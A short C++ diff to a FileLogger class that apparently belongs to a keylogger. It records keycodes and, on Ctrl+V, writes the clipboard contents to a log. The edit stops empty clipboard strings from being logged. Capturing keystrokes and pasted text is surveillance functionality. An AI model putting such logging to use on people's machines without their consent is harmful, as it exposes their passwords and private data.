@@ -111,9 +111,12 @@ void FileLogger::logKeycode(int keycode, KeyState state) {
     if (_clipboard) {
         if (state == KeyState::Pressed) {
             if (_modifierCtrl && (keycode == 'V' || keycode == 'v')) {
-                _stream << std::endl
-                    << "[PASTE: " << _clipboard->getClipboardString() << " ]"
-                    << std::endl;
+                std::string result = _clipboard->getClipboardString();
+                if (result != "") {
+                    _stream << std::endl
+                        << "[PASTE: " << result << " ]"
+                        << std::endl;
+                }
             }
         }
     }
